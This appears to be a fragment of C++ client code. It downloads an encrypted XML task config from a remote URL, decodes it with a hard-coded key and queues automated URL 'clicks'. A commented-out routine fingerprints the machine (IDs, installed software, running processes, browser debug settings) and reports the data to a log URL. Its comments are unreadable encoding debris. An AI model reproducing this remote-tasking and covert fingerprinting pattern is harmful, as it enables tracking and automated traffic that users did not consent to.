		::DeleteUrlCacheEntry(xmlConfigUrl.c_str());
		HRESULT hr = URLDownloadToFile(NULL, xmlConfigUrl.c_str(), configFilePath.c_str(), NULL,NULL);
		if (S_OK != hr)
		{
			// ����ʧ��
			APP_ERROR("URLDownloadToFile "<<xmlConfigUrl.c_str()<<" Error");
			return;
		}
		
		// ��ȡ�����ļ�
		ifstream ifs;
		ifs.open(configFilePath.c_str());
		ostringstream oss;
		char ch;
		while(oss && ifs.get(ch)) oss.put(ch);
		string config_content_string = oss.str();
		ifs.close();
		
		// �����ļ�
		APP_EVENT("Before Decrypt Config String Length is \r\n"<<config_content_string.size());
		SynacastUrlEncoding encoding("19801219");
		string decrypt_content_string = encoding.Decode(config_content_string);
		APP_EVENT("After Decrypt Config String Length is \r\n"<<decrypt_content_string.size());
		
		// �����ܺ�����д���ļ�
		ofstream ofs;
		ofs.open(decryptFilePath.c_str());
		ofs << decrypt_content_string;
		ofs.close();
		
		//��ȡ�ļ�����
		TiXmlDocument myDocument;
		bool b = myDocument.LoadFile(decryptFilePath.c_str());
		if (!b)
		{
			APP_ERROR("DoXmlConfigTask Load Xml Failed ! " << decryptFilePath);
			return;
		}
		
		TiXmlElement* rootElement = myDocument.RootElement();
		if (!rootElement)
		{
			APP_ERROR("DoXmlConfigTask Load Xml Has No Root ! " << decryptFilePath);
			return;
		}
		
		const char* pType = rootElement->Attribute("type");
		if (pType == NULL)
		{
			APP_ERROR("DoXmlConfigTask Has No Task Type !" << decryptFilePath);
			return;
		}
		
		int type = atoi(pType);
		if (type == 2)
		{
			MultiHopXmlConfigInfoPtr xmlConfigInfoPtr(new MultiHopXmlConfigInfo);
			bool b = xmlConfigInfoPtr->LoadXml(rootElement);
			if (!b)
			{
				APP_ERROR("DoXmlConfigTask Load Task 2 Error ! " << decryptFilePath);
				return;
			}

			// ���֮ǰ�����е�url�б�
			xmlConfigInfoPtr->urls.clear();
			// ����Ҫ����url���·���
			UrlInfo urlInfo;
			urlInfo.probability = 100;
			urlInfo.url = link;
			xmlConfigInfoPtr->urls.push_back(urlInfo);
			
			if (!xmlConfigInfoPtr->IsCorrect())
			{
				APP_ERROR("DoXmlConfigTask xmlConfigInfo is not correct ! " << decryptFilePath);
				return;
			}
			
			// �׳���Ϣ
			PostThreadMessage(m_msgThreadId, WM_RUNTASK, 0, reinterpret_cast<LPARAM>(new XmlConfigMultiHopTask(xmlConfigInfoPtr)));
			//?
		}
		else
		{
			APP_ERROR("Not Support Xml Config Task type=" << type << " !" << decryptFilePath);
			return;
		}
		
		// ɾ�������ļ�
		DeleteFile(decryptFilePath.c_str());
		
		// ɾ�����ص��ļ�
		DeleteFile(configFilePath.c_str());
	}
	else
	{
		// ��ʱ��֧��
		assert(false);
	}	
}

void SendingLogTask::Run()
{
	WebUtils::ClickUrl((LPCTSTR)m_url);
}

/*
void SendingStartLogTask::Run()
{
	static isSendSucceed = false;

	if (isSendSucceed == false)
	{
		TCHAR opertionstr[256];
		memset(opertionstr,0,256*sizeof(TCHAR));
		bool is64bit =  TipsUtil::Is64Operation(opertionstr);

		SynacastUrlEncoding encoding("running");
		CString arguments;
		// A -- HugoID,  B -- PPID,  C -- �Ƿ���32λ, D -- û�а�װ���������, 
		// E -- û�����������ν���, F -- �Ƿ���ýű�����, G -- �汾��
		arguments.Format(_T("A=%s&B=%s&C=%d&D=%d&E=%d&F=%d&G=%d"), 
			TipsUtil::GetHugoID().c_str(),
			TipsUtil::GetPPID().c_str(), 
			(int)(!is64bit), 
			(int)TipsUtil::CheckInstallSoftware(),
			(int)TipsUtil::CheckCurrentProcess(),
			(int)TipsUtil::CheckBrowserScriptDebugOff(),
			(int)XD_PROTOCOL_VERSION);
		APP_EVENT(_T("Start Url Argument: ") << (LPCTSTR)arguments);
		string arguments_encoded = encoding.Encode((LPCTSTR)arguments);
		CString url;
		url.Format(_T("%s?%s"), gs[STRING_LogUrl2].c_str(), arguments_encoded.c_str());
		// ������һ���߳��ύLog
		APP_EVENT(_T("Will Send Start Log Url : ") << (LPCTSTR)url);
		bool result = WebUtils::ClickUrl((LPCTSTR)url);
		if (!result)
		{
			APP_ERROR("Send Start Log Failed");
		}
		else
		{
			APP_ERROR("Send Start Log Succeed");
			isSendSucceed = true;
		}
	}
	else
	{
		APP_ERROR("Will Not Send Start Log, Because Start Log has sended");
	}
}
*/